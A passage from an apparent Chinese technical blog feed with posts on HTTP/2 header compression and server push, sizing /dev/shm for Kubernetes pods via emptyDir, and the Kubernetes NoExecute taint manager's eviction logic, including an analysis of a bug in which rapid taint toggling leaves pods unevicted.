<p>HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。假定一个页面有100个资源需要加载（这个数量对于今天的Web而言还是挺保守的）, 而每一次请求都有1kb的消息头（这同样也并不少见，因为Cookie和引用等东西的存在）, 则至少需要多消耗100kb来获取这些消息头。HTTP2.0可以维护一个字典，差量更新HTTP头部，大大降低因头部传输产生的流量。</p>
<p><img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/5.png" alt="avatar"></p>
<p>头部压缩的具体原理需要查看压缩算法HPACK 算法</p>
<p>通俗的语言解释下，压缩的原理。头部压缩需要在支持 HTTP/2 的浏览器和服务端之间:</p>
<ol>
<li>维护一份相同的静态字典（Static Table），包含常见的头部名称，以及特别常见的头部名称与值的组合；</li>
<li>维护一份相同的动态字典（Dynamic Table），可以动态的添加内容；</li>
<li>支持基于静态哈夫曼码表的哈夫曼编码（Huffman Coding）；</li>
</ol>
<p>静态字典的作用有两个：</p>
<ol>
<li>对于完全匹配的头部键值对，例如 “:method :GET”，可以直接使用一个字符表示；</li>
<li>对于头部名称可以匹配的键值对，例如 “cookie :xxxxxxx”，可以将名称使用一个字符表示。<h3 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h3></li>
</ol>
<p>服务端推送是一种在客户端请求之前发送数据的机制。当代网页使用了许多资源:HTML、样式表、脚本、图片等等。在HTTP/1.x中这些资源每一个都必须明确地请求。这可能是一个很慢的过程。浏览器从获取HTML开始，然后在它解析和评估页面的时候，增量地获取更多的资源。因为服务器必须等待浏览器做每一个请求，网络经常是空闲的和未充分使用的。</p>
<p>为了改善延迟，HTTP/2引入了server push，它允许服务端推送资源给浏览器，在浏览器明确地请求之前。一个服务器经常知道一个页面需要很多附加资源，在它响应浏览器第一个请求的时候，可以开始推送这些资源。这允许服务端去完全充分地利用一个可能空闲的网络，改善页面加载时间</p>
<p><img src="http1-0-http1-1%E4%B8%8Ehttp2-0%E7%9A%84%E5%8C%BA%E5%88%AB/6.png" alt="avatar"></p>
]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s pod 配置shareMemory</title>
    <url>/2021/03/31/k8s-pod-%E9%85%8D%E7%BD%AEshareMemory/</url>
    <content><![CDATA[<h3 id="Linux-shm-tempfs"><a href="#Linux-shm-tempfs" class="headerlink" title="Linux shm/tempfs"></a>Linux shm/tempfs</h3><p>linux默认支持 挂载tmpfs 时指定大小,如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount tmpfs -t tmpfs &#x2F;home&#x2F;test&#x2F; -o size&#x3D;1M</span><br></pre></td></tr></table></figure>
<p>这个命令只是逻辑占用，并不会占用真实的内存空间，但是在该目录</p>
<h3 id="测试-shm-大小"><a href="#测试-shm-大小" class="headerlink" title="测试 shm 大小"></a>测试 shm 大小</h3><p>使用以下命令写入文件到目录/dev/shm ，块大小为1M，数量1024个，一共1G大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;dev&#x2F;shm&#x2F;test.random  bs&#x3D;1M count&#x3D;1024</span><br></pre></td></tr></table></figure>

<p>创建shm时，会占用内存空间，可以使用free -hm 命令查看，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@ajkqpkmajvc6q-0:&#x2F;dev&#x2F;shm# free -mh</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           172G         17G        2.8G        4.2G        152G        148G</span><br><span class="line">Swap:            0B          0B          0B</span><br><span class="line">root@ajkqpkmajvc6q-0:&#x2F;dev&#x2F;shm# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;dev&#x2F;shm&#x2F;test1.random  bs&#x3D;1M count&#x3D;4096</span><br><span class="line">4096+0 records in</span><br><span class="line">4096+0 records out</span><br><span class="line">4294967296 bytes (4.3 GB, 4.0 GiB) copied, 2.6405 s, 1.6 GB&#x2F;s</span><br><span class="line">root@ajkqpkmajvc6q-0:&#x2F;dev&#x2F;shm# free -mh</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:           172G         17G        820M        8.2G        154G        144G</span><br><span class="line">Swap:            0B          0B          0B</span><br></pre></td></tr></table></figure>
<h3 id="kubernetes-Befor-1-20"><a href="#kubernetes-Befor-1-20" class="headerlink" title="kubernetes Befor 1.20"></a>kubernetes Befor 1.20</h3><p>虽然docker支持配置shm 参数，但是kubernetes并不支持该参数，社区里有基于emptyDir的方式使用，如下所示,定义emptyDir的卷，并挂载到容器的/dev/shm 目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: &#x2F;dev&#x2F;shm</span><br><span class="line">      name: shm</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  volumes:</span><br><span class="line">  - emptyDir:</span><br><span class="line">      medium: Memory</span><br><span class="line">      sizeLimit: 4Gi</span><br></pre></td></tr></table></figure>

<p>虽然这里有sizeLimit参数，但是其实并不生效，默认使用的大小为宿主机内存的一半，k8s代码里面进行挂载时，并未增加size参数，只是挂载tmpfs文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">k8s.io\kubernetes\pkg\volume\emptydir\empty_dir.go</span><br><span class="line">&#x2F;&#x2F; setupTmpfs creates a tmpfs mount at the specified directory.</span><br><span class="line">func (ed *emptyDir) setupTmpfs(dir string) error &#123;</span><br><span class="line">	if ed.mounter &#x3D;&#x3D; nil &#123;</span><br><span class="line">		return fmt.Errorf(&quot;memory storage requested, but mounter is nil&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	if err :&#x3D; ed.setupDir(dir); err !&#x3D; nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; Make SetUp idempotent.</span><br><span class="line">	medium, isMnt, err :&#x3D; ed.mountDetector.GetMountMedium(dir)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; If the directory is a mountpoint with medium memory, there is no</span><br><span class="line">	&#x2F;&#x2F; work to do since we are already in the desired state.</span><br><span class="line">	if isMnt &amp;&amp; medium &#x3D;&#x3D; v1.StorageMediumMemory &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	klog.V(3).Infof(&quot;pod %v: mounting tmpfs for volume %v&quot;, ed.pod.UID, ed.volName)</span><br><span class="line">	return ed.mounter.Mount(&quot;tmpfs&quot;, dir, &quot;tmpfs&quot;, nil &#x2F;* options *&#x2F;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这时候设置的sizeLimit：4Gi 起到了别的作用，kubelet的eviction manager会监控pod的emptyDir卷使用的空间大小，当使用空间超过该值时，会将该Pod驱逐(kubelet 可以获取到Pod对应容器的emptyDir卷空间使用信息 k8s.io\kubernetes\pkg\kubelet\server\stats)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">k8s.io\kubernetes\pkg\kubelet\eviction\eviction_manager.go</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; localStorageEviction checks the EmptyDir volume usage for each pod and determine whether it exceeds the specified limit and needs</span><br><span class="line">&#x2F;&#x2F; to be evicted. It also checks every container in the pod, if the container overlay usage exceeds the limit, the pod will be evicted too.</span><br><span class="line">func (m *managerImpl) localStorageEviction(summary *statsapi.Summary, pods []*v1.Pod) []*v1.Pod &#123;</span><br><span class="line">	statsFunc :&#x3D; cachedStatsFunc(summary.Pods)</span><br><span class="line">	evicted :&#x3D; []*v1.Pod&#123;&#125;</span><br><span class="line">	for _, pod :&#x3D; range pods &#123;</span><br><span class="line">		podStats, ok :&#x3D; statsFunc(pod)</span><br><span class="line">		if !ok &#123;</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if m.emptyDirLimitEviction(podStats, pod) &#123;</span><br><span class="line">			evicted &#x3D; append(evicted, pod)</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if m.podEphemeralStorageLimitEviction(podStats, pod) &#123;</span><br><span class="line">			evicted &#x3D; append(evicted, pod)</span><br><span class="line">			continue</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if m.containerEphemeralStorageLimitEviction(podStats, pod) &#123;</span><br><span class="line">			evicted &#x3D; append(evicted, pod)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return evicted</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以说，如果你想在低版本的k8s上使用shm，请不要设置sizeLimit</p>
<h3 id="kubernetes1-20版本"><a href="#kubernetes1-20版本" class="headerlink" title="kubernetes1.20版本"></a>kubernetes1.20版本</h3><p>1.20 版本合入了一个（PR)[<a href="https://github.com/kubernetes/kubernetes/pull/94444/commits],%E5%8F%AF%E4%BB%A5%E5%9C%A8kubelet%E8%AE%BE%E7%BD%AE%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AAfeature" target="_blank" rel="noopener">https://github.com/kubernetes/kubernetes/pull/94444/commits],可以在kubelet设置开启一个feature</a> 特性，kubelet在创建容器时，会为Pod挂载shm，此时还是需要为Pod以挂载卷的方式实现shm</p>
<ol>
<li>当 Pod 并没有设置memory limit时，此时 shm大小为node的Allocateable Memory大小</li>
<li>当Pod 设置了Memory Limit 但是在medium的emptyDir未设置sizeLimit时，shm 大小为Pod 的memory Limit</li>
<li>当Pod的medium emptyDir设置sizeLimit时，shm大小为sizeLimit</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">func calculateEmptyDirMemorySize(nodeAllocatableMemory *resource.Quantity, spec *volume.Spec, pod *v1.Pod) *resource.Quantity &#123;</span><br><span class="line">	&#x2F;&#x2F; if feature is disabled, continue the default behavior of linux host default</span><br><span class="line">	sizeLimit :&#x3D; &amp;resource.Quantity&#123;&#125;</span><br><span class="line">	if !utilfeature.DefaultFeatureGate.Enabled(features.SizeMemoryBackedVolumes) &#123;</span><br><span class="line">		return sizeLimit</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; size limit defaults to node allocatable (pods cant consume more memory than all pods)</span><br><span class="line">	sizeLimit &#x3D; nodeAllocatableMemory</span><br><span class="line">	zero :&#x3D; resource.MustParse(&quot;0&quot;)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; determine pod resource allocation</span><br><span class="line">	&#x2F;&#x2F; we use the same function for pod cgroup assigment to maintain consistent behavior</span><br><span class="line">	&#x2F;&#x2F; NOTE: this could be nil on systems that do not support pod memory containment (i.e. windows)</span><br><span class="line">	podResourceConfig :&#x3D; cm.ResourceConfigForPod(pod, false, uint64(100000))</span><br><span class="line">	if podResourceConfig !&#x3D; nil &amp;&amp; podResourceConfig.Memory !&#x3D; nil &#123;</span><br><span class="line">		podMemoryLimit :&#x3D; resource.NewQuantity(*(podResourceConfig.Memory), resource.BinarySI)</span><br><span class="line">		&#x2F;&#x2F; ensure 0 &lt; value &lt; size</span><br><span class="line">		if podMemoryLimit.Cmp(zero) &gt; 0 &amp;&amp; podMemoryLimit.Cmp(*sizeLimit) &lt; 1 &#123;</span><br><span class="line">			sizeLimit &#x3D; podMemoryLimit</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; volume local size is  used if and only if less than what pod could consume</span><br><span class="line">	if spec.Volume.EmptyDir.SizeLimit !&#x3D; nil &#123;</span><br><span class="line">		volumeSizeLimit :&#x3D; spec.Volume.EmptyDir.SizeLimit</span><br><span class="line">		&#x2F;&#x2F; ensure 0 &lt; value &lt; size</span><br><span class="line">		if volumeSizeLimit.Cmp(zero) &gt; 0 &amp;&amp; volumeSizeLimit.Cmp(*sizeLimit) &lt; 1 &#123;</span><br><span class="line">			sizeLimit &#x3D; volumeSizeLimit</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return sizeLimit</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s 中的taints机制</title>
    <url>/2022/01/02/k8s-%E4%B8%AD%E7%9A%84taints%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="Taint-使用说明"><a href="#Taint-使用说明" class="headerlink" title="Taint 使用说明"></a>Taint 使用说明</h2><p>给节点增加taint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl taint nodes node1 key1&#x3D;value1:NoSchedule</span><br><span class="line">kubectl taint nodes node1 key1&#x3D;value1:NoExcute</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable&#x3D;true:NoExecute</span><br><span class="line"></span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable- # 取消污点</span><br></pre></td></tr></table></figure>
<p>设置节点不可调度并增加taint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl cordon node2</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable:NoExecute</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable:NoSchedule</span><br><span class="line"></span><br><span class="line">取消</span><br><span class="line">kubectl uncordon node2</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable-</span><br></pre></td></tr></table></figure>
<p>在节点上增加taint后（即增加污点后），k8s调度时对无法容忍这些污点的Pod，不会将这些Pod 调度到这些节点， 对于taint为effect: NoExecute的污点，会交由taint_manager进行处理，即NoExecuteTaintManager，节点上的所有Pod 都会被污点管理器（taint_manager.go）计划删除。而在节点被认定为不可用状态到删除节点上的 Pod 之间是有一段时间的，这段时间被称为容忍度，即tolerationSeconds</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tolerations:</span><br><span class="line">      - key: node.kubernetes.io&#x2F;not-ready</span><br><span class="line">        operator: Exists</span><br><span class="line">        effect: NoExecute</span><br><span class="line">        tolerationSeconds: 180</span><br><span class="line">      - key: node.kubernetes.io&#x2F;unreachable</span><br><span class="line">        operator: Exists</span><br><span class="line">        effect: NoExecute</span><br><span class="line">        tolerationSeconds: 180</span><br></pre></td></tr></table></figure>
<p>我们在创建Pod时，有时候并没有配置tolerations，此时k8s 会自动为Pod增加两个默认的toleration，TaintNodeNotReady,TaintNodeUnreachable，参考如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var (</span><br><span class="line">	defaultNotReadyTolerationSeconds &#x3D; flag.Int64(&quot;default-not-ready-toleration-seconds&quot;, 300,</span><br><span class="line">		&quot;Indicates the tolerationSeconds of the toleration for notReady:NoExecute&quot;+</span><br><span class="line">			&quot; that is added by default to every pod that does not already have such a toleration.&quot;)</span><br><span class="line"></span><br><span class="line">	defaultUnreachableTolerationSeconds &#x3D; flag.Int64(&quot;default-unreachable-toleration-seconds&quot;, 300,</span><br><span class="line">		&quot;Indicates the tolerationSeconds of the toleration for unreachable:NoExecute&quot;+</span><br><span class="line">			&quot; that is added by default to every pod that does not already have such a toleration.&quot;)</span><br><span class="line"></span><br><span class="line">	notReadyToleration &#x3D; api.Toleration&#123;</span><br><span class="line">		Key:               v1.TaintNodeNotReady,</span><br><span class="line">		Operator:          api.TolerationOpExists,</span><br><span class="line">		Effect:            api.TaintEffectNoExecute,</span><br><span class="line">		TolerationSeconds: defaultNotReadyTolerationSeconds,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unreachableToleration &#x3D; api.Toleration&#123;</span><br><span class="line">		Key:               v1.TaintNodeUnreachable,</span><br><span class="line">		Operator:          api.TolerationOpExists,</span><br><span class="line">		Effect:            api.TaintEffectNoExecute,</span><br><span class="line">		TolerationSeconds: defaultUnreachableTolerationSeconds,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">	for _, toleration :&#x3D; range tolerations &#123;</span><br><span class="line">		if (toleration.Key &#x3D;&#x3D; v1.TaintNodeNotReady || len(toleration.Key) &#x3D;&#x3D; 0) &amp;&amp;</span><br><span class="line">			(toleration.Effect &#x3D;&#x3D; api.TaintEffectNoExecute || len(toleration.Effect) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">			toleratesNodeNotReady &#x3D; true</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (toleration.Key &#x3D;&#x3D; v1.TaintNodeUnreachable || len(toleration.Key) &#x3D;&#x3D; 0) &amp;&amp;</span><br><span class="line">			(toleration.Effect &#x3D;&#x3D; api.TaintEffectNoExecute || len(toleration.Effect) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">			toleratesNodeUnreachable &#x3D; true</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !toleratesNodeNotReady &#123;</span><br><span class="line">		pod.Spec.Tolerations &#x3D; append(pod.Spec.Tolerations, notReadyToleration)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !toleratesNodeUnreachable &#123;</span><br><span class="line">		pod.Spec.Tolerations &#x3D; append(pod.Spec.Tolerations, unreachableToleration)</span><br><span class="line">	&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h2 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h2><p>NoExecuteTaintManager<br>处理节点node上taint的更新、删除事件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pkg&#x2F;controller&#x2F;nodelifecycle&#x2F;scheduler&#x2F;taint_manager.go:419</span><br><span class="line">这里只处理节点NoExecute的taint，对于这种Taint,我们需要驱逐节点的Pod</span><br><span class="line">	klog.V(4).Infof(&quot;Noticed node update: %#v&quot;, nodeUpdate)</span><br><span class="line">	taints :&#x3D; getNoExecuteTaints(node.Spec.Taints)</span><br><span class="line">	func() &#123;</span><br><span class="line">		tc.taintedNodesLock.Lock()</span><br><span class="line">		defer tc.taintedNodesLock.Unlock()</span><br><span class="line">		klog.V(4).Infof(&quot;Updating known taints on node %v: %v&quot;, node.Name, taints)</span><br><span class="line">		if len(taints) &#x3D;&#x3D; 0 &#123;</span><br><span class="line">			delete(tc.taintedNodes, node.Name)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			tc.taintedNodes[node.Name] &#x3D; taints</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">在查询到节点的taint后，再查询节点上运行的Pod，此时会判断节点的taint是否为空，如果为空，则需要将之前的删除Pod事件取消掉，不再进行删除pod</span><br><span class="line">	&#x2F;&#x2F; Short circuit, to make this controller a bit faster.</span><br><span class="line">	if len(taints) &#x3D;&#x3D; 0 &#123;</span><br><span class="line">		klog.V(4).Infof(&quot;All taints were removed from the Node %v. Cancelling all evictions...&quot;, node.Name)</span><br><span class="line">		for i :&#x3D; range pods &#123;</span><br><span class="line">			tc.cancelWorkWithEvent(types.NamespacedName&#123;Namespace: pods[i].Namespace, Name: pods[i].Name&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">取消Pod 的驱逐操作</span><br><span class="line"> func (tc *NoExecuteTaintManager) emitCancelPodDeletionEvent(nsName types.NamespacedName) &#123;</span><br><span class="line">	if tc.recorder &#x3D;&#x3D; nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	ref :&#x3D; &amp;v1.ObjectReference&#123;</span><br><span class="line">		Kind:      &quot;Pod&quot;,</span><br><span class="line">		Name:      nsName.Name,</span><br><span class="line">		Namespace: nsName.Namespace,</span><br><span class="line">	&#125;</span><br><span class="line">	tc.recorder.Eventf(ref, v1.EventTypeNormal, &quot;TaintManagerEviction&quot;, &quot;Cancelling deletion of Pod %s&quot;, nsName.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后续就是依次处理每个节点的Pod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  如果节点的pod的toleration 不满足节点的taint，则取消对pod的定时事件处理，立即将该pod删除，将pod 加入到删除队列</span><br><span class="line">allTolerated, usedTolerations :&#x3D; v1helper.GetMatchingTolerations(taints, tolerations)</span><br><span class="line">if !allTolerated &#123;</span><br><span class="line">	klog.V(2).Infof(&quot;Not all taints are tolerated after update for Pod %v on %v&quot;, podNamespacedName.String(), nodeName)</span><br><span class="line">	&#x2F;&#x2F; We&#39;re canceling scheduled work (if any), as we&#39;re going to delete the Pod right away.</span><br><span class="line">	tc.cancelWorkWithEvent(podNamespacedName)</span><br><span class="line">	tc.taintEvictionQueue.AddWork(NewWorkArgs(podNamespacedName.Name, podNamespacedName.Namespace), time.Now(), time.Now())</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  对比toleration time，如果超过时间，则删除pod的删除事件处理，立即执行删除pod 操作，将删除pod的操作加入执行队列</span><br><span class="line">minTolerationTime :&#x3D; getMinTolerationTime(usedTolerations)</span><br><span class="line">&#x2F;&#x2F; getMinTolerationTime returns negative value to denote infinite toleration.</span><br><span class="line">if minTolerationTime &lt; 0 &#123;</span><br><span class="line">	klog.V(4).Infof(&quot;Current tolerations for %v tolerate forever, cancelling any scheduled deletion.&quot;, podNamespacedName.String())</span><br><span class="line">	tc.cancelWorkWithEvent(podNamespacedName)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">startTime :&#x3D; now</span><br><span class="line">triggerTime :&#x3D; startTime.Add(minTolerationTime)</span><br><span class="line">scheduledEviction :&#x3D; tc.taintEvictionQueue.GetWorkerUnsafe(podNamespacedName.String()) ## 获得一个指定时间执行的worker</span><br><span class="line">if scheduledEviction !&#x3D; nil &#123;</span><br><span class="line">	startTime &#x3D; scheduledEviction.CreatedAt</span><br><span class="line">	if startTime.Add(minTolerationTime).Before(triggerTime) &#123; &#x2F;&#x2F;在容忍时间内，不触发删除pod</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	tc.cancelWorkWithEvent(podNamespacedName)  ## 这里为什么要执行cancel 呢？当超过了执行时间，是不是应该立即删除？取消之后，再添加到taintEvictionQueue，删除时间是不是就延后了?答案：此时startTime 超过triggertime，在调用AddWork函数时，会直接触发删除操作</span><br><span class="line">&#125;</span><br><span class="line">tc.taintEvictionQueue.AddWork(NewWorkArgs(podNamespacedName.Name, podNamespacedName.Namespace), startTime, triggerTime)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">经过查看time——worker的代码,可以解释上述问题，在执行tc.taintEvictionQueue.AddWork 时，会调用CreateWorker，当fireAt 时间小于createAt 时间时，直接触发删除pod 的操作</span><br><span class="line"></span><br><span class="line">func CreateWorker(args *WorkArgs, createdAt time.Time, fireAt time.Time, f func(args *WorkArgs) error) *TimedWorker &#123;</span><br><span class="line">	delay :&#x3D; fireAt.Sub(createdAt)</span><br><span class="line">	if delay &lt;&#x3D; 0 &#123;</span><br><span class="line">		go f(args)</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	timer :&#x3D; time.AfterFunc(delay, func() &#123; f(args) &#125;)</span><br><span class="line">	return &amp;TimedWorker&#123;</span><br><span class="line">		WorkItem:  args,</span><br><span class="line">		CreatedAt: createdAt,</span><br><span class="line">		FireAt:    fireAt,</span><br><span class="line">		Timer:     timer,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>taintEvictionQueue的处理函数：尝试删除pod，删除失败时，尝试5次，每一次sleep 0.01秒</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func deletePodHandler(c clientset.Interface, emitEventFunc func(types.NamespacedName)) func(args *WorkArgs) error &#123;</span><br><span class="line">	return func(args *WorkArgs) error &#123;</span><br><span class="line">		ns :&#x3D; args.NamespacedName.Namespace</span><br><span class="line">		name :&#x3D; args.NamespacedName.Name</span><br><span class="line">		klog.V(0).Infof(&quot;NoExecuteTaintManager is deleting Pod: %v&quot;, args.NamespacedName.String())</span><br><span class="line">		if emitEventFunc !&#x3D; nil &#123;</span><br><span class="line">			emitEventFunc(args.NamespacedName)</span><br><span class="line">		&#125;</span><br><span class="line">		var err error</span><br><span class="line">		for i :&#x3D; 0; i &lt; retries; i++ &#123;</span><br><span class="line">			err &#x3D; c.CoreV1().Pods(ns).Delete(context.TODO(), name, metav1.DeleteOptions&#123;&#125;)</span><br><span class="line">			if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">				break</span><br><span class="line">			&#125;</span><br><span class="line">			time.Sleep(10 * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>timedworkerqueue,在执行workerfun（deletePodHandler）后，就直接把worker在队列中删除，不再执行了，删除失败了如何处理呢？等待后续的处理？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (q *TimedWorkerQueue) getWrappedWorkerFunc(key string) func(args *WorkArgs) error &#123;</span><br><span class="line">	return func(args *WorkArgs) error &#123;</span><br><span class="line">		err :&#x3D; q.workFunc(args)</span><br><span class="line">		q.Lock()</span><br><span class="line">		defer q.Unlock()</span><br><span class="line">		if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">			&#x2F;&#x2F; To avoid duplicated calls we keep the key in the queue, to prevent</span><br><span class="line">			&#x2F;&#x2F; subsequent additions.</span><br><span class="line">			q.workers[key] &#x3D; nil</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			delete(q.workers, key)</span><br><span class="line">		&#125;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="频繁给节点增加污点删除污点的问题"><a href="#频繁给节点增加污点删除污点的问题" class="headerlink" title="频繁给节点增加污点删除污点的问题"></a>频繁给节点增加污点删除污点的问题</h2><h3 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h3><p>  将一个Statefulset的Pod运行在node2，此时给节点打上污点,taint_manager 会驱逐节点的Pod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl cordon node2</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable:NoExecute</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable:NoSchedule</span><br></pre></td></tr></table></figure>
<p>再移除节点的污点,此时 该pod会重新运行在node2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubectl uncordon node2</span><br><span class="line">kubectl taint node node2 node.kubernetes.io&#x2F;unschedulable-</span><br></pre></td></tr></table></figure>

<p>给节点增加污点，Statefulset的Pod被删除，再执行移除节点污点的操作，POd正常运行在该节点，此时间隔比较短的实际执行增加污点的操作，此时会发现等待很长时间，Statefulset的Pod也不会被删除，如下所示<br> <img src="/2022/01/02/k8s-%E4%B8%AD%E7%9A%84taints%E6%9C%BA%E5%88%B6/1.png" alt="avatar"></p>
<p>观察日志可以看到，当清楚节点污点时，controller-manager会将驱逐队列清空<br>Cancelling TimedWorkerQueue item…<br> <img src="/2022/01/02/k8s-%E4%B8%AD%E7%9A%84taints%E6%9C%BA%E5%88%B6/2.png" alt="avatar"></p>
<p> 日志中是执行了两边增加污点和删除污点的操作，删除污点时正常情况会有两条<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timed_workers.go:129] Cancelling TimedWorkerQueue item 67a41957-f57d-4156-ae53-dc796a3c66f2&#x2F;cn0r7j27908mp-0</span><br></pre></td></tr></table></figure><br>此时只有1条，证明还没有删除 67a41957-f57d-4156-ae53-dc796a3c66f2/cn0r7j27908mp-0 对应的key，但是此时收到了增加污点的操作，由于队列中仍然还存在这个key，则没有执行CreateWorker的操作，导致Pod 一直存在,参考以下代码和日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; AddWork adds a work to the WorkerQueue which will be executed not earlier than &#96;fireAt&#96;.</span><br><span class="line">func (q *TimedWorkerQueue) AddWork(args *WorkArgs, createdAt time.Time, fireAt time.Time) &#123;</span><br><span class="line">   key :&#x3D; args.KeyFromWorkArgs()</span><br><span class="line">   klog.V(4).Infof(&quot;Adding TimedWorkerQueue item %v at %v to be fired at %v&quot;, key, createdAt, fireAt)</span><br><span class="line"></span><br><span class="line">   q.Lock()</span><br><span class="line">   defer q.Unlock()</span><br><span class="line">   if _, exists :&#x3D; q.workers[key]; exists &#123;</span><br><span class="line">      klog.Warningf(&quot;Trying to add already existing work for %+v. Skipping.&quot;, args)</span><br><span class="line">      return</span><br><span class="line">   &#125;</span><br><span class="line">   worker :&#x3D; CreateWorker(args, createdAt, fireAt, q.getWrappedWorkerFunc(key))</span><br><span class="line">   q.workers[key] &#x3D; worker</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到日志有以下信息</p>
